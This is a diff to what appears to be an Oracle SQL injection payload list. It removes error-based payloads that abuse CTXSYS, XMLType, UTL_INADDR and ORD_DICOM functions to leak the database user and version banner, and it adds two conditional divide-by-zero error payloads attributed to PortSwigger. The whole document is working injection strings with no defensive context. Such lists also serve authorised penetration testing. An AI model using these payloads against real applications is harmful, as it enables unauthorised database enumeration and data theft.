@@ -1,15 +1,5 @@
 # Oracle — Error-Based Payloads
 
-# --- CTXSYS.DRITHSX.SN errors ---
-' AND 1=CTXSYS.DRITHSX.SN(user,1337)--
-' AND 1=CTXSYS.DRITHSX.SN((SELECT banner FROM v$version WHERE ROWNUM=1),1337)--
-
-# --- XMLType errors ---
-' AND 1=XMLType('<a>'||(SELECT banner FROM v$version WHERE ROWNUM=1)||'</a>')--
-' AND 1=2 UNION SELECT XMLType('<a>'||(SELECT user FROM dual)||'</a>') FROM dual--
-
-# --- UTL_INADDR (older Oracle) ---
-' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))--
-
-# --- ORDSYS.ORD_DICOM errors ---
-' AND 1=ORDSYS.ORD_DICOM.GETMAPPINGXPATH((SELECT banner FROM v$version WHERE ROWNUM=1),user,user)--
+# --- Conditional errors (PortSwigger, most portable) ---
+' AND 1=(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)--
+' AND 1=(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)--
